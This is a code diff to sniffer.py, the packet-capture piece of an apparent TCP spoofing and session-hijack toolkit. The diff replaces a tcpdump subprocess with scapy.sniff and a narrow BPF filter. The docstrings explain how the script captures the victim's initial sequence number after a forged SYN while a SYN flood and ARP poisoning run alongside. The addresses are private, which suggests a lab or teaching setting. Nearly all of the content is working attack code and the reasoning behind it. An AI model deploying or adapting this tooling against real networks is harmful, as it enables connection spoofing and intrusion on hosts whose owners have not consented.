@@ -1,5 +1,5 @@
 """
-sniffer.py — ISN Capture via tcpdump
+sniffer.py — ISN Capture via Scapy
 
 Role in the attack: After we send a forged SYN (pretending to be 10.0.2.30),
 the target (10.0.2.20) replies with SYN/ACK containing its Initial Sequence
@@ -13,19 +13,18 @@ systems involved generated sequential, guessable ISNs. Modern kernels use
 cryptographically random ISNs (RFC 6528), so interception via MITM is the only
 viable approach in a LAN context.
 
-Why tcpdump instead of scapy.sniff()?
-tcpdump applies BPF filters inside the kernel before packets reach userspace,
-which means zero-copy filtering with minimal overhead. scapy.sniff() with a
-filter string also compiles BPF, but adds per-packet Python overhead for
-callback dispatch. In a high-traffic environment (we are running a SYN flood in
-parallel), missing the one SYN/ACK that matters would be catastrophic. tcpdump
-with -c 1 exits as soon as it sees the first match, guaranteeing low latency
-from capture to ISN extraction.
+Why pass filter= to scapy.sniff() instead of using lfilter=?
+scapy.sniff(filter="...") compiles the expression into BPF bytecode and pushes
+it down into the Linux kernel before any packet crosses the kernel/userspace
+boundary. The SYN flood running in parallel produces thousands of packets per
+second; BPF discards all of them inside the kernel, so Python never allocates a
+single object for them. Using lfilter= (a Python callback) would instead copy
+every flood packet into userspace and run a Python function on each one — under
+heavy load the socket receive buffer fills up and the kernel starts dropping
+packets before Python can drain it, risking loss of the one SYN/ACK we need.
 """
 
-from scapy.all import *
-import subprocess
-import re
+from scapy.all import sniff, TCP
 
 
 def sniff_for_syn_ack(target_ip, server_ip, client_port, interface="eth0", timeout=10):
@@ -33,22 +32,18 @@ def sniff_for_syn_ack(target_ip, server_ip, client_port, interface="eth0", timeo
     Block until a SYN/ACK from target_ip is seen on the wire, then return its ISN.
 
     The BPF filter is deliberately narrow:
-      src host <target>     — only packets originating from the victim
-      dst host <server>     — destined to the IP we are impersonating
+      src host <target>      — only packets originating from the victim
+      dst host <server>      — destined to the IP we are impersonating
       tcp port <client_port> — on the exact source port of our forged SYN
-      tcp flags SYN+ACK     — must have both SYN and ACK set (rules out plain SYN
-                              or ACK-only packets that might match the other terms)
+      tcp flags SYN+ACK      — must have both SYN and ACK set (rules out plain
+                               SYN or ACK-only packets that match the other terms)
 
-    Using tcp[tcpflags] byte-level inspection rather than a symbolic flag name
-    ensures compatibility across different tcpdump versions and OS TCP stacks.
-
-    tcpdump flags:
-      -i  <iface>  capture on the correct interface
-      -l           line-buffer stdout so Popen can read line by line if needed
-      -n           skip DNS reverse lookups (faster, no spurious delay)
-      -c 1         exit after the first matching packet (we only need one ISN)
+    The bit-mask idiom & (tcp-syn|tcp-ack) == (tcp-syn|tcp-ack) means: "both
+    bits must be 1, but I don't care about RST, FIN, PSH, or URG." A simpler
+    == (tcp-syn|tcp-ack) would additionally require the other four bits to be 0,
+    which is unnecessarily strict.
     """
-    print(f"--- Sniffing for SYN/ACK using tcpdump ---")
+    print("--- Sniffing for SYN/ACK using Scapy ---")
 
     filter_str = (
         f"src host {target_ip} and dst host {server_ip} "
@@ -56,58 +51,29 @@ def sniff_for_syn_ack(target_ip, server_ip, client_port, interface="eth0", timeo
         f"and (tcp[tcpflags] & (tcp-syn|tcp-ack)) == (tcp-syn|tcp-ack)"
     )
 
-    command = [
-        "tcpdump",
-        "-i", interface,
-        "-l",
-        "-n",
-        "-c", "1",
-        filter_str,
-    ]
-
-    print(f"[+] Running tcpdump with filter: \"{filter_str}\"")
+    print(f"[+] Sniffing with BPF filter: \"{filter_str}\"")
 
     try:
-        process = subprocess.Popen(
-            command,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            text=True,
+        # count=1  — stop after the first matching packet; we only need one ISN.
+        # store=1  — keep the packet in memory so we can read TCP.seq below.
+        # timeout  — give up if nothing matches within this many seconds.
+        # filter   — compiled to BPF in the kernel; flood packets never reach Python.
+        packets = sniff(
+            iface=interface,
+            filter=filter_str,
+            count=1,
+            timeout=timeout,
         )
 
-        # communicate() blocks until tcpdump exits (either -c 1 matched or timeout).
-        # The timeout here must be longer than the delay between starting the sniffer
-        # and sending the forged SYN in main.py (currently ~1 s), with plenty of
-        # margin for the ARP poison to take effect on the target's routing.
-        stdout, stderr = process.communicate(timeout=timeout)
-
-        if process.returncode != 0 and not stdout:
-            print(f"[-] tcpdump exited with error or timed out. Stderr: {stderr.strip()}")
+        if not packets:
+            print("\n[-] Sniffer timed out. No matching SYN/ACK packet was captured.")
             return None
 
-        # tcpdump's default one-line format for a SYN/ACK looks like:
-        #   HH:MM:SS.ffffff IP 10.0.2.20.1023 > 10.0.2.30.514: Flags [S.], seq 2847361920, ack 123456790, ...
-        #
-        # "seq <number>," is unique to the sequence field in this context.
-        # We use a tight regex to avoid accidentally matching "ack <number>" or
-        # other numeric fields in the same line.
-        match = re.search(r"seq (\d+),", stdout)
-        if not match:
-            print("[-] Could not find sequence number in tcpdump output.")
-            print(f"    Output was: {stdout.strip()}")
-            return None
-
-        target_isn = int(match.group(1))
+        # Scapy already parsed the packet; no regex needed.
+        # TCP.seq on the SYN/ACK is the target's ISN.
+        target_isn = packets[0][TCP].seq
         print(f"\n[+] Captured SYN/ACK packet. Target's ISN is: {target_isn}")
         return target_isn
-
-    except subprocess.TimeoutExpired:
-        # This usually means the ARP poisoning hasn't taken effect yet, or the
-        # forged SYN was dropped before reaching the target. The main orchestrator
-        # should treat None as a fatal failure and abort cleanly.
-        print("\n[-] Sniffer timed out. No matching SYN/ACK packet was captured.")
-        process.kill()
-        return None
 
     except Exception as e:
         print(f"An error occurred during sniffing: {e}")
